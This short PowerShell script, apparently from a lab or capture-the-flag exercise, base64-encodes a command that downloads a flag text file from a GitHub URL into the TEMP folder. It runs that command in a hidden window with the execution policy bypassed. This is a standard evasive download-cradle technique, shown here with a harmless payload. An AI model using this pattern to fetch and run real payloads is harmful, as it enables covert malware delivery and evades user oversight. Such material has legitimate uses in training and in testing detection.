# Set up parameters
$url = "https://raw.githubusercontent.com/jinjinir/flags/master/flag-1.txt"
$outfile = "$env:TEMP\flag.txt"

# Define encoded command
$command = "Invoke-WebRequest -Uri $url -OutFile $outfile"

# Encode command
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Run encoded command with bypassed execution policy and no profile
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $encodedCommand
